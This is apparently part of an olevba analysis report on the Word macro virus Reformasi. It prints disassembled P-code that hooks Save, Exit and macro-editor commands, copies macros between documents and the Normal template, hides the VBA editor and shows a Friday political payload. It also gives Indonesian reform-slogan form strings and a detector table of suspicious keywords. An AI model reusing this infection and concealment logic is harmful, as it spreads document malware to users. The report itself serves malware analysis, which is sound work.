' 	ArgsCall NormKeDok 0x0000 
' Line #145:
' 	ArgsCall ReformTutup 0x0000 
' Line #146:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #147:
' 	EndSub 
' Line #148:
' Line #149:
' 	FuncDefn (Sub FileSave())
' Line #150:
' 	ArgsCall ReformInisialisasi 0x0000 
' Line #151:
' 	ArgsCall DokKeNorm 0x0000 
' Line #152:
' 	ArgsCall NormKeDok 0x0000 
' Line #153:
' 	ArgsCall ReformTutup 0x0000 
' Line #154:
' 	OnError Kesalahan6 
' Line #155:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #156:
' 	Label Kesalahan6 
' Line #157:
' 	EndSub 
' Line #158:
' Line #159:
' 	FuncDefn (Sub HelpAbout())
' Line #160:
' 	OnError Kesalahan7 
' Line #161:
' 	Ld FormAbout 
' 	ArgsMemCall Show 0x0000 
' Line #162:
' 	Label Kesalahan7 
' Line #163:
' 	EndSub 
' Line #164:
' Line #165:
' 	FuncDefn (Sub FileExit())
' Line #166:
' 	OnError Kesalahan8 
' Line #167:
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x07CE 
' 	Gt 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	And 
' 	LitStr 0x000D "c:\reform.off"
' 	Ld vbHidden 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld FormReformis 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #168:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #169:
' 	Label Kesalahan8 
' Line #170:
' 	EndSub 
' Line #171:
' Line #172:
' 	FuncDefn (Sub ToolsOptions())
' Line #173:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #174:
' 	ArgsCall AnginReformasi 0x0000 
' Line #175:
' 	EndSub 
' Line #176:
' Line #177:
' 	FuncDefn (Sub FileNew())
' Line #178:
' 	ArgsCall AnginReformasi 0x0000 
' Line #179:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #180:
' 	EndSub 
' Line #181:
' Line #182:
' 	FuncDefn (Sub FileTemplates())
' Line #183:
' 	ArgsCall AnginReformasi 0x0000 
' Line #184:
' 	EndSub 
' Line #185:
' Line #186:
' 	FuncDefn (Sub ToolsMacro())
' Line #187:
' 	ArgsCall AnginReformasi 0x0000 
' Line #188:
' 	EndSub 
' Line #189:
' Line #190:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #191:
' 	ArgsCall AnginReformasi 0x0000 
' Line #192:
' 	EndSub 
' Line #193:
' Line #194:
' 	FuncDefn (Sub ToolsCustomize())
' Line #195:
' 	ArgsCall AnginReformasi 0x0000 
' Line #196:
' 	EndSub 
' Line #197:
' Line #198:
' 	FuncDefn (Sub ViewVBCode())
' Line #199:
' 	ArgsCall AnginReformasi 0x0000 
' Line #200:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #201:
' 	EndSub 
' Line #202:
' Line #203:
' 	FuncDefn (Sub Organizer())
' Line #204:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sebuah persembahanan dari seorang Reformis.�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Kode: 47.91.21.10.51.268�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Politik
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Kembalikan kekuasaan negara kepada rakyat. Pastikan MPR/DPR benar-benar mewakili suara hati rakyat. Tempatkan orang-orang terbaik dan profesianal di negeri ini pada lembaga-lembaga negara. Ingat: 'The right man on the right place'.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomak
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ekonomi
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Yang membuat suatu negara makmur adalah apa yang dimiliki negeri itu (sumber daya alam) dan apa yang kita terima dari negara lain (devisa). Untuk itu, tingkatkan perolehan hasil dari alam kaya kita: perluas pertanian dan perkebunan dan olah hasil tambang secara optimal. Perolehlah devisa sebanyak-banyaknya: olah industri pariwisata dengan profesional dan modern; jadikan proyek nasional unggulan, perbesar ekspor baik komoditi maupun sumber daya manusia terdidik. Pastikan distribusi pendapatan dapat merata dengan membasmi habis monopoli dan kartel.�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Sosiali
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Rangsang tumbuhnya kehidupan sosial yang sehat dan dinamis. Sadarkan: negara kita sangat majemuk; jangan sampai satu suku bangsa merasa lebih dari lainnya; kita satu dan bersaudara dalam kesatuan utuh Negara Kesatuan Republik Indonesia.�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Budayai
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tingkatkan dan pertahankan budaya tinggi negari kita. Jangan lupa bahwa negara kita adalah negara agamis yang bermoral tinggi. Cegah berkembangnya budaya rusak dan rendah yang kadang berkulit indah. Lindungi rakyat negara kita dari kerusakkannya.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pertahanan dan Keamanan8�,
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Jadikan Angkatan Bersenjata Republik Indonesia menjadi pelindung rakyat yang tangguh dan disegani dari serangan negara luar. Perluas wawasan terhadap jenis serangan yang lebih maju dari sekedar serangan fisik.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomai
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Negara kita tercinta akan segera memasuki masa keemasannya setelah para reformis membersihkan negeri ini dari kotoran-kotoran yang menghalangi negeri besar ini dari kejayaannya.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Hidup Reformasi Damai!n8
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Kunci Kejayaann
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma0
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormKunci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN './Virus.MSWord.Reformasi' - OLE stream: 'Macros/FormReformis'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |47.91.21.10         |IPv4 address                                 |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

